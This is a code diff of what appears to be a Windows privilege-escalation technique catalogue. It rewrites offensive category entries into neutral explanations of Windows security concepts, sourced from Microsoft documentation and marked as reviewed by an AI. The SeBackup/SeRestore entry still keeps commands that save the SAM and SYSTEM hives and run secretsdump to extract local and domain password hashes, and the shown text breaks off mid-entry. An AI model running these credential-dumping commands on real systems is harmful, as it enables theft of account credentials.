+        "description": "Windows provides Credentials Management APIs for applications to obtain and manage information such as user names and passwords, including a user credentials store. DPAPI provides encryption and integrity protection for application data. These are different mechanisms: a storage location alone does not describe the protection applied to its contents.",
+        "id": "pe-cat-creds",
+        "kind": "category",
+        "label": "Stored Credentials",
+        "mitre": {
+          "id": "T1552",
+          "url": "https://attack.mitre.org/techniques/T1552/"
+        },
+        "phase": "finding",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft, Credentials Management",
+            "section": "Introduction",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthn/credentials-management"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft, CryptProtectData function",
+            "section": "Introduction; Remarks",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata"
+          }
+        ],
+        "summary": "Distinguish credential storage from data-protection mechanisms."
+      },
+      "claims": [
+        {
+          "text": "Windows Credentials Management APIs obtain and manage credential information and provide options to add information to the user's credentials store.",
+          "section": "Microsoft, Credentials Management — Introduction",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthn/credentials-management"
+          ]
+        },
+        {
+          "text": "CryptProtectData encrypts application data and adds a keyed integrity check against tampering.",
+          "section": "Microsoft, CryptProtectData function — Introduction; Remarks",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata"
+          ]
+        }
+      ]
+    }
+  },
   // Stored Credentials grouped by where the secret lives.
-  { id: 'creds-registry', label: 'Registry & Hives', phase: 'finding', kind: 'category', summary: 'Secrets in the SAM/SYSTEM hives and registry.', description: 'Local account hashes and cleartext in the registry: dump the SAM + SYSTEM hives, abuse HiveNightmare/SeriousSAM for a shadow-copy read, or read a Winlogon autologon password.', mitre: mitre('T1552.002'), references: [ { label: 'HackTricks, Stealing Credentials', url: 'https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/index.html' }, ], },
-  { id: 'creds-files', label: 'Files & History', phase: 'finding', kind: 'category', summary: 'Secrets in saved credentials, history, and config files.', description: 'Credentials left in files: cmdkey-saved credentials, PowerShell history, and configs, scripts, and unattend files across the host.', mitre: mitre('T1552.001'), references: [ { label: 'HackTricks, Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }, ], },
-  { id: 'creds-vaults', label: 'Vaults & DPAPI', phase: 'finding', kind: 'category', summary: 'DPAPI-protected secrets and password vaults.', description: 'Decrypt DPAPI-protected credentials and vaults, and loot password managers and browser stores.', mitre: mitre('T1555.004'), references: [ { label: 'harmj0y, Operational Guidance for Offensive User DPAPI Abuse', url: 'https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/' }, ], },
-  { id: 'pe-cat-services', label: 'Service Misconfigurations', phase: 'finding', kind: 'category', summary: 'Weak service ACLs, paths, binaries, and registry keys.', description: 'A SYSTEM service you can influence (a weak service DACL (SERVICE_CHANGE_CONFIG), an unquoted path, a writable binary, or a writable service registry key), so you choose what it runs.', mitre: mitre('T1543.003'), references: [ { label: 'HackTricks, Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }, ], },
-  { id: 'pe-cat-dll', label: 'DLL & PATH Hijacking', phase: 'finding', kind: 'category', summary: 'Privileged process loads a DLL you control.', description: 'A privileged process resolves a DLL by name from a location you can write to: a hijackable service DLL, or a user-writable directory on the system PATH.', mitre: mitre('T1574.001'), references: [ { label: 'HackTricks, Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }, ], },
-  { id: 'pe-cat-tasks', label: 'Scheduled Tasks & Autoruns', phase: 'finding', kind: 'category', summary: 'Writable code a privileged context runs automatically.', description: 'A binary or script a higher-privileged context launches on a schedule or at logon is writable by you. Overwrite it and wait for, or invoke, the trigger.', mitre: mitre('T1053.005'), references: [ { label: 'HackTricks, Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }, ], },
-  { id: 'pe-cat-apps', label: 'Privileged App & Service Abuse', phase: 'finding', kind: 'category', summary: 'Abuse a privileged local app or service.', description: 'Abuse an application or service running at higher privilege: a local MSSQL instance, vulnerable third-party software with a known LPE, an exploitable privileged service (PrintNightmare), an admin-run GUI you can break out of, or the Windows Installer when the AlwaysInstallElevated policy lets any user install an MSI as SYSTEM.', references: [ { label: 'HackTricks, Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }, ], },
-  { id: 'pe-cat-cve', label: 'Known Exploits (CVE)', phase: 'finding', kind: 'category', summary: 'Run a public LPE exploit or named technique (CVE or not).', description: 'When config and credentials are clean, run a public local-privilege-escalation exploit: kernel and driver CVEs, a few famous non-kernel one-shots, plus recent Defender-remediation races (BlueHammer/RedSun). Map the build and hotfixes first. Kernel/driver and classic one-shot CVEs are loud and best on older, unpatched hosts, but the Defender-remediation 0-days (BlueHammer, patched April 2026; RedSun) hit current, fully-patched builds.', mitre: mitre('T1068'), references: [ { label: 'HackTricks, Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }, ], },
+  {
+    "id": "creds-registry",
+    "label": "Registry & Hives",
+    "phase": "finding",
+    "kind": "category",
+    "summary": "Understand registry hives and access control on keys.",
+    "description": "A registry hive groups keys, subkeys, and values with supporting files that Windows loads into memory. Registry keys are securable objects with security descriptors. Windows checks requested key access against that descriptor, so the registry's organization and a caller's permission to read or change a key are separate concepts.",
+    "mitre": {
+      "id": "T1552.002",
+      "url": "https://attack.mitre.org/techniques/T1552/002/"
+    },
+    "references": [
+      {
+        "label": "Microsoft, Registry Hives",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives",
+        "section": "Introduction",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft, Registry Key Security and Access Rights",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights",
+        "section": "Introduction",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
+        "description": "A registry hive groups keys, subkeys, and values with supporting files that Windows loads into memory. Registry keys are securable objects with security descriptors. Windows checks requested key access against that descriptor, so the registry's organization and a caller's permission to read or change a key are separate concepts.",
+        "id": "creds-registry",
+        "kind": "category",
+        "label": "Registry & Hives",
+        "mitre": {
+          "id": "T1552.002",
+          "url": "https://attack.mitre.org/techniques/T1552/002/"
+        },
+        "phase": "finding",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft, Registry Hives",
+            "section": "Introduction",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft, Registry Key Security and Access Rights",
+            "section": "Introduction",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights"
+          }
+        ],
+        "summary": "Understand registry hives and access control on keys."
+      },
+      "claims": [
+        {
+          "text": "A hive is a logical grouping of registry keys, subkeys, and values with supporting files loaded into memory.",
+          "section": "Microsoft, Registry Hives — Introduction",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives"
+          ]
+        },
+        {
+          "text": "Registry keys have security descriptors, and opening a key checks the requested access rights against its descriptor.",
+          "section": "Microsoft, Registry Key Security and Access Rights — Introduction; RegOpenKeyEx access check",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights"
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "creds-files",
+    "label": "Files & History",
+    "phase": "finding",
+    "kind": "category",
+    "summary": "Recognize the confidentiality risk of secrets in files and history.",
+    "description": "Files and command history can retain sensitive information. Microsoft documents that PSReadLine persists command history, which can contain passwords, and attempts to filter sensitive entries. That filtering should not be treated as a guarantee that history is free of secrets. CWE-312 describes the separate storage weakness of keeping sensitive information in cleartext where it may be accessible outside the intended control boundary.",
+    "mitre": {
+      "id": "T1552.001",
+      "url": "https://attack.mitre.org/techniques/T1552/001/"
+    },
+    "references": [
+      {
+        "label": "Microsoft, about_PSReadLine",
+        "url": "https://learn.microsoft.com/en-us/powershell/module/psreadline/about/about_psreadline?view=powershell-7.6",
+        "section": "Command History",
+        "kind": "primary"
+      },
+      {
+        "label": "MITRE, CWE-312: Cleartext Storage of Sensitive Information",
+        "url": "https://cwe.mitre.org/data/definitions/312.html",
+        "section": "Description",
+        "kind": "taxonomy"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
+        "description": "Files and command history can retain sensitive information. Microsoft documents that PSReadLine persists command history, which can contain passwords, and attempts to filter sensitive entries. That filtering should not be treated as a guarantee that history is free of secrets. CWE-312 describes the separate storage weakness of keeping sensitive information in cleartext where it may be accessible outside the intended control boundary.",
+        "id": "creds-files",
+        "kind": "category",
+        "label": "Files & History",
+        "mitre": {
+          "id": "T1552.001",
+          "url": "https://attack.mitre.org/techniques/T1552/001/"
+        },
+        "phase": "finding",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft, about_PSReadLine",
+            "section": "Command History",
+            "url": "https://learn.microsoft.com/en-us/powershell/module/psreadline/about/about_psreadline?view=powershell-7.6"
+          },
+          {
+            "kind": "taxonomy",
+            "label": "MITRE, CWE-312: Cleartext Storage of Sensitive Information",
+            "section": "Description",
+            "url": "https://cwe.mitre.org/data/definitions/312.html"
+          }
+        ],
+        "summary": "Recognize the confidentiality risk of secrets in files and history."
+      },
+      "claims": [
+        {
+          "text": "PSReadLine persists command history that can contain passwords and attempts to filter sensitive information; treating the filter as an absolute secrecy guarantee is not supported by this description.",
+          "section": "Microsoft, about_PSReadLine — Command History; the conclusion about a guarantee is an editorial inference from the documented limitation",
+          "sources": [
+            "https://learn.microsoft.com/en-us/powershell/module/psreadline/about/about_psreadline?view=powershell-7.6"
+          ]
+        },
+        {
+          "text": "CWE-312 describes sensitive information stored in cleartext in a resource that may be accessible outside the intended control boundary.",
+          "section": "MITRE, CWE-312: Cleartext Storage of Sensitive Information — Description",
+          "sources": [
+            "https://cwe.mitre.org/data/definitions/312.html"
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "creds-vaults",
+    "label": "Vaults & DPAPI",
+    "phase": "finding",
+    "kind": "category",
+    "summary": "Understand the purpose and scope of DPAPI protection.",
+    "description": "DPAPI lets applications encrypt data and adds a keyed integrity check to detect tampering. Decryption normally depends on the same user logon credentials and the same computer, with exceptions documented by Microsoft. A reference to DPAPI therefore describes a protection mechanism; it does not mean that every credential store has identical contents or behavior.",
+    "mitre": {
+      "id": "T1555.004",
+      "url": "https://attack.mitre.org/techniques/T1555/004/"
+    },
+    "references": [
+      {
+        "label": "Microsoft, CryptProtectData function",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata",
+        "section": "Introduction; Remarks",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
+        "description": "DPAPI lets applications encrypt data and adds a keyed integrity check to detect tampering. Decryption normally depends on the same user logon credentials and the same computer, with exceptions documented by Microsoft. A reference to DPAPI therefore describes a protection mechanism; it does not mean that every credential store has identical contents or behavior.",
+        "id": "creds-vaults",
+        "kind": "category",
+        "label": "Vaults & DPAPI",
+        "mitre": {
+          "id": "T1555.004",
+          "url": "https://attack.mitre.org/techniques/T1555/004/"
+        },
+        "phase": "finding",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft, CryptProtectData function",
+            "section": "Introduction; Remarks",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata"
+          }
+        ],
+        "summary": "Understand the purpose and scope of DPAPI protection."
+      },
+      "claims": [
+        {
+          "text": "CryptProtectData provides data encryption and a keyed integrity check.",
+          "section": "Microsoft, CryptProtectData function — Introduction; Remarks",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata"
+          ]
+        },
+        {
+          "text": "DPAPI decryption normally requires matching user logon credentials and the same computer, subject to documented exceptions.",
+          "section": "Microsoft, CryptProtectData function — Introduction; Remarks",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata"
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "pe-cat-services",
+    "label": "Service Misconfigurations",
+    "phase": "finding",
+    "kind": "category",
+    "summary": "Separate service-object permissions from the service account.",
+    "description": "Windows secures the service control manager and individual service objects through access rights and security descriptors. A running service uses the security context of its configured account, represented by an access token. Permission to manage a service object and the identity under which the service runs are distinct parts of the security model.",
+    "mitre": {
+      "id": "T1543.003",
+      "url": "https://attack.mitre.org/techniques/T1543/003/"
+    },
+    "references": [
+      {
+        "label": "Microsoft, Service Security and Access Rights",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights",
+        "section": "Introduction; Access Rights for the Service Control Manager; Access Rights for a Service",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft, Service User Accounts",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-user-accounts",
+        "section": "Introduction",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
+        "description": "Windows secures the service control manager and individual service objects through access rights and security descriptors. A running service uses the security context of its configured account, represented by an access token. Permission to manage a service object and the identity under which the service runs are distinct parts of the security model.",
+        "id": "pe-cat-services",
+        "kind": "category",
+        "label": "Service Misconfigurations",
+        "mitre": {
+          "id": "T1543.003",
+          "url": "https://attack.mitre.org/techniques/T1543/003/"
+        },
+        "phase": "finding",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft, Service Security and Access Rights",
+            "section": "Introduction; Access Rights for the Service Control Manager; Access Rights for a Service",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft, Service User Accounts",
+            "section": "Introduction",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-user-accounts"
+          }
+        ],
+        "summary": "Separate service-object permissions from the service account."
+      },
+      "claims": [
+        {
+          "text": "The service control manager and individual service objects have separately defined access rights and security descriptors.",
+          "section": "Microsoft, Service Security and Access Rights — Introduction; Access Rights for the Service Control Manager; Access Rights for a Service",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights"
+          ]
+        },
+        {
+          "text": "The service control manager logs on the service's account and attaches the resulting access token to its process.",
+          "section": "Microsoft, Service User Accounts — Introduction",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/services/service-user-accounts"
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "pe-cat-dll",
+    "label": "DLL & PATH Hijacking",
+    "phase": "finding",
+    "kind": "category",
+    "summary": "Understand dynamic libraries and their execution context.",
+    "description": "A dynamic-link library is a module containing functions and data that other modules can use. Windows maps a loaded DLL into the calling process's virtual address space. An exported DLL function runs in the context of the thread that calls it; the DLL itself does not establish a separate privileged account.",
+    "mitre": {
+      "id": "T1574.001",
+      "url": "https://attack.mitre.org/techniques/T1574/001/"
+    },
+    "references": [
+      {
+        "label": "Microsoft, Dynamic-Link Libraries",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-libraries",
+        "section": "Introduction",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft, About Dynamic-Link Libraries",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/dlls/about-dynamic-link-libraries",
+        "section": "DLLs and Memory Management",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
+        "description": "A dynamic-link library is a module containing functions and data that other modules can use. Windows maps a loaded DLL into the calling process's virtual address space. An exported DLL function runs in the context of the thread that calls it; the DLL itself does not establish a separate privileged account.",
+        "id": "pe-cat-dll",
+        "kind": "category",
+        "label": "DLL & PATH Hijacking",
+        "mitre": {
+          "id": "T1574.001",
+          "url": "https://attack.mitre.org/techniques/T1574/001/"
+        },
+        "phase": "finding",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft, Dynamic-Link Libraries",
+            "section": "Introduction",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-libraries"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft, About Dynamic-Link Libraries",
+            "section": "DLLs and Memory Management",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/dlls/about-dynamic-link-libraries"
+          }
+        ],
+        "summary": "Understand dynamic libraries and their execution context."
+      },
+      "claims": [
+        {
+          "text": "A DLL is a module containing functions and data usable by another application or DLL.",
+          "section": "Microsoft, Dynamic-Link Libraries — Introduction",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-libraries"
+          ]
+        },
+        {
+          "text": "A loaded DLL occupies the process's virtual address space, and its exported functions run in the calling thread's context.",
+          "section": "Microsoft, About Dynamic-Link Libraries — DLLs and Memory Management",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/dlls/about-dynamic-link-libraries"
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "pe-cat-tasks",
+    "label": "Scheduled Tasks & Autoruns",
+    "phase": "finding",
+    "kind": "category",
+    "summary": "Separate automatic startup from a task's security context.",
+    "description": "Task Scheduler registers and runs each task under a specified security context associated with an account or group. Automatic startup also includes mechanisms such as Run and RunOnce registry entries, which launch programs at user logon. Being scheduled or started automatically does not, by itself, describe a program's administrative authority.",
+    "mitre": {
+      "id": "T1053.005",
+      "url": "https://attack.mitre.org/techniques/T1053/005/"
+    },
+    "references": [
+      {
+        "label": "Microsoft, Security Contexts for Tasks",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks",
+        "section": "Introduction; Specifying Credentials",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft, Run and RunOnce Registry Keys",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys",
+        "section": "Introduction",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
+        "description": "Task Scheduler registers and runs each task under a specified security context associated with an account or group. Automatic startup also includes mechanisms such as Run and RunOnce registry entries, which launch programs at user logon. Being scheduled or started automatically does not, by itself, describe a program's administrative authority.",
+        "id": "pe-cat-tasks",
+        "kind": "category",
+        "label": "Scheduled Tasks & Autoruns",
+        "mitre": {
+          "id": "T1053.005",
+          "url": "https://attack.mitre.org/techniques/T1053/005/"
+        },
+        "phase": "finding",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft, Security Contexts for Tasks",
+            "section": "Introduction; Specifying Credentials",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft, Run and RunOnce Registry Keys",
+            "section": "Introduction",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys"
+          }
+        ],
+        "summary": "Separate automatic startup from a task's security context."
+      },
+      "claims": [
+        {
+          "text": "Scheduled tasks run under a specified security context associated with an account or group.",
+          "section": "Microsoft, Security Contexts for Tasks — Introduction; Specifying Credentials",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks"
+          ]
+        },
+        {
+          "text": "Run and RunOnce are registry mechanisms for starting programs at user logon.",
+          "section": "Microsoft, Run and RunOnce Registry Keys — Introduction",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys"
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "pe-cat-apps",
+    "label": "Privileged App & Service Abuse",
+    "phase": "finding",
+    "kind": "category",
+    "summary": "Understand the authority of application and service processes.",
+    "description": "Windows represents an application process's security context with an access token that identifies its account and privileges. A service runs with a token for its configured account. Understanding that execution context is part of understanding application security; the presence of an application or service alone does not establish administrative authority.",
+    "references": [
+      {
+        "label": "Microsoft, Access Tokens",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
+        "section": "Introduction",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft, Service User Accounts",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-user-accounts",
+        "section": "Introduction",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
+        "description": "Windows represents an application process's security context with an access token that identifies its account and privileges. A service runs with a token for its configured account. Understanding that execution context is part of understanding application security; the presence of an application or service alone does not establish administrative authority.",
+        "id": "pe-cat-apps",
+        "kind": "category",
+        "label": "Privileged App & Service Abuse",
+        "phase": "finding",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft, Access Tokens",
+            "section": "Introduction",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft, Service User Accounts",
+            "section": "Introduction",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-user-accounts"
+          }
+        ],
+        "summary": "Understand the authority of application and service processes."
+      },
+      "claims": [
+        {
+          "text": "An access token identifies the account and privileges associated with a process or thread.",
+          "section": "Microsoft, Access Tokens — Introduction",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
+          ]
+        },
+        {
+          "text": "A service executes in its configured account's security context and receives an access token for that account.",
+          "section": "Microsoft, Service User Accounts — Introduction",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/services/service-user-accounts"
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "pe-cat-cve",
+    "label": "Known Exploits (CVE)",
+    "phase": "finding",
+    "kind": "category",
+    "summary": "Read vulnerability records and severity scores accurately.",
+    "description": "A CVE Record describes a vulnerability associated with a CVE identifier and includes affected products, versions, and references. CVSS expresses vulnerability severity; NIST explicitly distinguishes it from risk. A record or score is information for review, not a demonstration of behavior on a particular computer.",
+    "mitre": {
+      "id": "T1068",
+      "url": "https://attack.mitre.org/techniques/T1068/"
+    },
+    "references": [
+      {
+        "label": "CVE Program, CVE Record Lifecycle",
+        "url": "https://www.cve.org/about/Process",
+        "section": "CVE Records",
+        "kind": "primary"
+      },
+      {
+        "label": "NIST NVD, Vulnerability Metrics",
+        "url": "https://nvd.nist.gov/vuln-metrics/cvss",
+        "section": "Introduction",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
+        "description": "A CVE Record describes a vulnerability associated with a CVE identifier and includes affected products, versions, and references. CVSS expresses vulnerability severity; NIST explicitly distinguishes it from risk. A record or score is information for review, not a demonstration of behavior on a particular computer.",
+        "id": "pe-cat-cve",
+        "kind": "category",
+        "label": "Known Exploits (CVE)",
+        "mitre": {
+          "id": "T1068",
+          "url": "https://attack.mitre.org/techniques/T1068/"
+        },
+        "phase": "finding",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "CVE Program, CVE Record Lifecycle",
+            "section": "CVE Records",
+            "url": "https://www.cve.org/about/Process"
+          },
+          {
+            "kind": "primary",
+            "label": "NIST NVD, Vulnerability Metrics",
+            "section": "Introduction",
+            "url": "https://nvd.nist.gov/vuln-metrics/cvss"
+          }
+        ],
+        "summary": "Read vulnerability records and severity scores accurately."
+      },
+      "claims": [
+        {
+          "text": "A CVE Record associates an identifier with descriptive vulnerability data, affected products and versions, and references.",
+          "section": "CVE Program, CVE Record Lifecycle — CVE Records",
+          "sources": [
+            "https://www.cve.org/about/Process"
+          ]
+        },
+        {
+          "text": "CVSS measures vulnerability severity and is not a measure of risk.",
+          "section": "NIST NVD, Vulnerability Metrics — Introduction",
+          "sources": [
+            "https://nvd.nist.gov/vuln-metrics/cvss"
+          ]
+        }
+      ]
+    }
+  },
 
   // ── Token Privileges (whoami /priv) ─────────────────────────────────────────
   {
@@ -158,180 +1405,1119 @@ export const peTechniqueNodes = [
     opsec: 'DCOM activation plus a local NTLM coercion; the binary is signatured, though the local-only footprint is quieter than RoguePotato.',
   },
   {
-    id: 'pe-sebackup-restore',
-    label: 'SeBackup / SeRestore',
-    phase: 'hold',
-    summary: 'Read protected files (SAM/SYSTEM, NTDS) bypassing ACLs.',
-    affects: 'All supported Windows versions (privilege model).',
-    description: r`SeBackupPrivilege grants read access to any file regardless of its ACL; SeRestorePrivilege grants write. On a workstation/server, copy out the SAM and SYSTEM hives for offline hash extraction. On a Domain Controller, use diskshadow (VSS) + robocopy /b to exfiltrate ntds.dit, and also pull the SYSTEM hive (reg save HKLM\SYSTEM) because ntds.dit is encrypted with a key protected by the DC's boot key: without SYSTEM the hashes cannot be decrypted. Then parse both offline to dump every domain hash. This DC / ntds.dit path is MITRE T1003.003 (NTDS), distinct from the local SAM path (T1003.002).`,
-    tools: [
-      { name: 'diskshadow', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow' },
-      { name: 'impacket-secretsdump', url: 'https://github.com/fortra/impacket' },
+    "id": "pe-sebackup-restore",
+    "label": "SeBackup / SeRestore",
+    "phase": "hold",
+    "summary": "Distinguish the Windows rights for backup and restoration.",
+    "affects": "All supported Windows versions (privilege model).",
+    "description": "SeBackupPrivilege and SeRestorePrivilege are separate Windows user rights. Microsoft associates the first with system backup and the second with restoring backed-up files and directories. Their administrative purposes should be distinguished when describing a security configuration.",
+    "tools": [
+      {
+        "name": "diskshadow",
+        "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow"
+      },
+      {
+        "name": "impacket-secretsdump",
+        "url": "https://github.com/fortra/impacket"
+      }
     ],
-    commands: [
-      { label: 'Copy SAM + SYSTEM hives', code: r`reg save HKLM\SAM C:\Temp\sam.hive
-reg save HKLM\SYSTEM C:\Temp\system.hive`, lang: 'cmd' },
-      { label: 'Extract hashes offline', code: r`impacket-secretsdump -sam sam.hive -system system.hive LOCAL`, lang: 'bash' },
-      { label: 'DC path: parse ntds.dit with the SYSTEM hive', code: r`impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL`, lang: 'bash' },
+    "commands": [
+      {
+        "label": "Copy SAM + SYSTEM hives",
+        "code": "reg save HKLM\\SAM C:\\Temp\\sam.hive\nreg save HKLM\\SYSTEM C:\\Temp\\system.hive",
+        "lang": "cmd"
+      },
+      {
+        "label": "Extract hashes offline",
+        "code": "impacket-secretsdump -sam sam.hive -system system.hive LOCAL",
+        "lang": "bash"
+      },
+      {
+        "label": "DC path: parse ntds.dit with the SYSTEM hive",
+        "code": "impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL",
+        "lang": "bash"
+      }
     ],
-    mitre: mitre('T1003.002'),
-    references: [
-      { label: 'HackTricks, Abusing Tokens', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html' },
-      { label: 'MITRE T1003.003, NTDS (the DC / ntds.dit path)', url: 'https://attack.mitre.org/techniques/T1003/003/' },
+    "mitre": {
+      "id": "T1003.002",
+      "url": "https://attack.mitre.org/techniques/T1003/002/"
+    },
+    "references": [
+      {
+        "label": "Microsoft — Back up files and directories (archived policy reference)",
+        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/back-up-files-and-directories",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft — Restore files and directories (archived policy reference)",
+        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/restore-files-and-directories",
+        "kind": "primary"
+      },
+      {
+        "label": "HackTricks, Abusing Tokens",
